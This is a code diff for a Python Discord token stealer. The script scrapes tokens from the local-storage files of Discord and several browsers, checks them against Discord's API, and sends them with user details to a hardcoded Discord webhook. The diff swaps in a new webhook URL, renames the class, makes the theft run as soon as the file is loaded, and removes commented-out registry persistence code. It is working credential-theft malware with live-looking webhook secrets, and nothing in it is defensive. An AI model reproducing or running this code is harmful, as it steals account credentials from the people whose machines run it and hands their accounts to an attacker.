@@ -1,21 +1,6 @@
 import os, re, json, random, platform, socket, uuid, requests
 
-# pth = str(os.path.dirname(os.path.realpath(__file__)))
-
-# PC_local = os.getenv('LOCALAPPDATA')
-
-# TOKEN_Location = str(PC_local + '\\' +'discord\\apps-base\\DiscordHooker.exe') 
-# TOKEN_Folder = str(PC_local + '\\' +'discord\\apps-base')
-# if not os.path.exists(TOKEN_Folder): os.mkdir(TOKEN_Folder)
-# if pth != TOKEN_Folder:
-#     shutil.copy(__file__, TOKEN_Folder + '//DiscordHooker.py')
-#     # key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
-#     # winreg.SetValueEx(key,'Discord Hooker',0,winreg.REG_SZ,TOKEN_Location)
-#     # key.Close()
-# else: pass
-
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/925054131058655262/4zh0g7oE55UBKW0vAO2ZANxXNDKgA_qv_g-QVL-NYIozb98F_5afs5Bpm2azE_bOQrnn"
+WEBHOOK_URL = "https://discord.com/api/webhooks/925764166462111794/97ov5VO7Y7gtZxcn3_zUOQb36lrNIK1Gybxfx__06kOa3EqE4AgBFhfC6LUkdjCu7cKX"
 
 
 def retrieve_user(token):
@@ -40,7 +25,7 @@ def system_info(return_type=0):
         return json.dumps(info)
 
 
-class TokkenGetter:
+class TokenMonster:
 
     def __init__(self):
         if os.name != 'nt':
@@ -54,19 +39,17 @@ class TokkenGetter:
 
         self.scrape_tokens()
 
-        # if self.tokens == self.pre_tokkens
-        # print(self.tokens)
         for token in self.tokens:
-            # if 
+            print(token)
             color = random.randint(0, 0xFFFFFF)
             raw_user_data = retrieve_user(token)
             user_json_str = json.dumps(raw_user_data)
             user = json.loads(user_json_str)
             if "username" in user:
-                 
+                # print("ds")
                 if WEBHOOK_URL:
-                    webhook_data = {"username": "yOur goddamn token is here", "embeds": [
-                        dict(title="Found a valid Token",
+                    webhook_data = {"username": "nane to jendast ame kharab", "embeds": [
+                        dict(title="Sniped a token.",
                              color=f'{color}',
                              fields=[
                                  {
@@ -91,27 +74,11 @@ class TokkenGetter:
                                  },
                              ]),
                     ]}
-                    
+
                     result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
                     print(result.text)
+
             self.tokens.remove(token)
-            # print(token)
-#             if not os.path.isfile("./LOG.old"):
-#                 with open("LOG.old", "w") as f:
-#                     f.write(token)
-#             else:
-#                 with open('LOG.old', "r+") as f:
-#                     # for token in self.tokens:
-#                     pre_token = f.read()
-#                     # print(token + '\n'+pre_token)
-#                     if pre_token == token:
-#                         exit()
-#                     else:
-#                         result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
-#                         print(result.text)
-#                     f.seek(0)
-#                     f.write(token)
-#                     f.truncate()
 
     def scrape_tokens(self):
 
@@ -139,9 +106,7 @@ class TokkenGetter:
             'Brave': self.pc_local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Iridium': self.pc_local + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
-        # raw_user_data = retrieve_user(token)
-        # user_json_str = json.dumps(raw_user_data)
-        # user = json.loads(user_json_str)
+
         for source, path in crawl.items():
             if not os.path.exists(path):
                 continue
@@ -153,21 +118,5 @@ class TokkenGetter:
                         for token in re.findall(regex, line):
                             self.tokens.append(token)
 
-        # if not os.path.isfile("./LOG.old"):
-        #     with open("LOG.old", "w") as f:
-        #         f.write(json.dumps(self.tokens))
-        # else:
-        #     with open('LOG.old', "r+") as f:
-        #         # for token in self.tokens:
-        #         pre_token = f.read()
-        #         if common_data(json.dumps(pre_token), json.dumps(self.tokens)):
-        #             exit()
-        #         else:
-        #             pass
-        #         # f.seek(0)
-        #         f.write(json.dumps(self.tokens))
-        #         # f.truncate()
 
-if __name__ == "__main__":
-
-    init = TokkenGetter()
+init = TokenMonster()
